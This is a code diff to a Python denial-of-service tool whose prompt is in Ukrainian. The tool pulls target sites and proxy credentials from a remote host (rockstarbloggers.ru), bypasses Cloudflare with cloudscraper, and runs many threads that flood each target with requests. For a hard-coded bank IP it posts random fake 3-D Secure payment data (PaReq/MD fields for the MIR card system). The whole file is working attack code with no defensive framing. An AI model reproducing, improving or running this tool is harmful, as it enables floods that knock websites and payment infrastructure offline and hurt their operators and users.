@@ -1,8 +1,10 @@
- # -*- coding: utf-8 -*-
+# -*- coding: utf-8 -*-
 import cloudscraper
 import requests
+import string
+
 from bs4 import BeautifulSoup
-from urllib.parse import unquote
+from urllib.parse import unquote, urlparse
 from gc import collect
 from loguru import logger
 from os import system
@@ -20,56 +22,166 @@ try:
 except:
     sleep(5)
     HOSTS = loads(requests.get("http://rockstarbloggers.ru/hosts.json").content)
-MAX_REQUESTS = 5000
+
 disable_warnings()
 logger.remove()
 logger.add(stderr, format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>")
 threads = int(input('Кількість потоків: '))
 
+ALLOVED_PAREQ_CHARS = string.ascii_letters + string.digits
+ALLOVED_MD_CHARS = string.digits
+
+BANK_IPS = ["https://185.170.2.7"]
+MAX_REQUESTS = 1000
+
+PROXY_CHECKING = "https://www.google.com"
+
+
+def base_scraper():
+    scraper = cloudscraper.create_scraper(browser={'browser': 'firefox',
+                                                   'platform': 'android',
+                                                   'mobile': True},)
+    scraper.headers.update({
+            'Content-Type': 'application/json',
+            'cf-visitor': 'https',
+            'User-Agent': random_useragent(),
+            'Connection': 'keep-alive',
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Language': 'ru',
+            'x-forwarded-proto': 'https',
+            'Accept-Encoding': 'gzip, deflate, br'})
+
+    return scraper
+
+
+def generate_MIR_data(url):
+    dat = {}
+    dat["PaReq"] = ''.join([choice(ALLOVED_PAREQ_CHARS) for _ in range(490)])
+    dat["MD"] = ''.join([choice(ALLOVED_MD_CHARS) for _ in range(10)])
+    dat["TermUrl"] = "https%3A%2F%2F" + urlparse(url).netloc
+    return dat
+
+
+def check_proxie(checker, proxy_str):
+    scraper = base_scraper()
+
+    scraper.proxies.update({'http': "http://" + (proxy_str + checker),
+                            'https': "https://" + (proxy_str + checker)})
+
+    try:
+        resp = scraper.get(checker, timeout=0.5)
+        if resp.status_code < 200 or resp.status_code > 400:
+            return False
+
+        return True
+    except:
+        return False
+
+
+def check_taget(target, proxy_str):
+    scraper = base_scraper()
+
+    scraper.proxies.update({'http': "http://" + proxy_str + target,
+                           'https': "https://" + proxy_str + target})
+
+    try:
+        resp = scraper.get(target)
+        if resp.status_code > 500:
+            return False
+    except:
+        return False
+
+    return True
+
+
+def get_proxy(data, checker):
+    logger.info("CHECKING GIVEN PROXIES")
+
+    for proxy in data['proxy']:
+        auth = proxy["auth"]
+        ip = proxy["ip"]
+
+        out_proxy = (auth + "@" + ip + "/")
+        if check_proxie(checker, out_proxy):
+            return out_proxy
+    return None
+
+
 
 def mainth():
-	while True:
-		scraper = cloudscraper.create_scraper(browser={'browser': 'firefox','platform': 'android','mobile': True},)
-		scraper.headers.update({'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(), 'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https', 'Accept-Encoding': 'gzip, deflate, br'})
-		logger.info("GET RESOURCES FOR ATTACK")
-		content = scraper.get(choice(HOSTS)).content
-		if content:
-		    data = loads(content)
-		else:
-		    sleep(5)
-		    continue
-		logger.info("STARTING ATTACK TO " + data['site']['page'])
-		site = unquote(data['site']['page'])
-		if site.startswith('http') == False:
-		    site = "https://" + site
-		try:
-		    attack = scraper.get(site)
-		    if attack.status_code >= 302 and attack.status_code >= 200:
-		        for proxy in data['proxy']:
-		            auth = proxy["auth"]
-		            ip = proxy["ip"]
-		            scraper.proxies.update({'http': ip + "://" +auth, 'https': ip + "://" + auth})
-		            response = scraper.get(site)
-		            if response.status_code >= 200 and response.status_code <= 302:
-		                for i in range(MAX_REQUESTS):
-		                    response = scraper.get(site)
-		                    logger.info("ATTACKED; RESPONSE CODE: " + str(response.status_code))
-		    else:
-		        for i in range(MAX_REQUESTS):
-		            response = scraper.get(site)
-		            logger.info("ATTACKED; RESPONSE CODE: " + str(response.status_code))
-		except:
-		    logger.warning("issue happened")
-		    continue
+    current_target = None
+    current_proxy = None
+
+    while True:
+
+        scraper = base_scraper()
+
+        logger.info("GET RESOURCES FOR ATTACK")
+
+        # Fetching data with proxy and targets
+        content = {}
+        data = {}
+        while True:
+            current_host = choice(HOSTS)
+            try:
+                content = scraper.get(current_host).content
+                data = loads(content)
+                break
+            except:
+                logger.warning("FAILED TO FETCH API TARGETS")
+                sleep(1)
+                logger.info("FETCHING API AGAIN")
+
+        if current_target is None:
+            current_target = unquote(data['site']['page'])
+
+        if current_target.startswith('http') is False:
+            current_target = "https://" + current_target
+
+        # Choosing and checking proxy
+        if current_proxy is not None:
+            if not check_proxie(current_host, current_proxy):
+                current_proxy = get_proxy(data, current_host)
+                # current_proxy = get_proxy(data)
+                pass
+        else:
+            current_proxy = get_proxy(data, current_host)
+            # current_proxy = get_proxy(data)
+
+        if current_proxy is None:
+            continue
+
+        # Trying target
+        if not check_taget(current_target, current_proxy):
+            current_target = None
+            continue
+
+        scraper.proxies.update({"http": "http://" + current_proxy + current_target,
+                                "https": "https://" + current_proxy + current_target})
+
+        logger.info("STARTING ATTACK TO " + current_target)
+        for _ in range(MAX_REQUESTS):
+            response = {}
+            try:
+                if current_target in BANK_IPS:
+                    response = scraper.post(current_target,
+                                            generate_MIR_data(current_target))
+                else:
+                    response = scraper.get(current_target)
+                logger.info("ATTACKED; RESPONSE CODE: " +
+                            str(response.status_code))
+            except:
+                logger.warning("GOT ISSUE WHILE ATTACKING")
 
 
 def cleaner():
-	while True:
-		sleep(60)
-		collect()
+    while True:
+        sleep(60)
+        collect()
+
 
 if __name__ == '__main__':
-	for _ in range(threads):
-		Thread(target=mainth).start()
+    for _ in range(threads):
+        Thread(target=mainth).start()
 
-	Thread(target=cleaner, daemon=True).start()
+    Thread(target=cleaner, daemon=True).start()
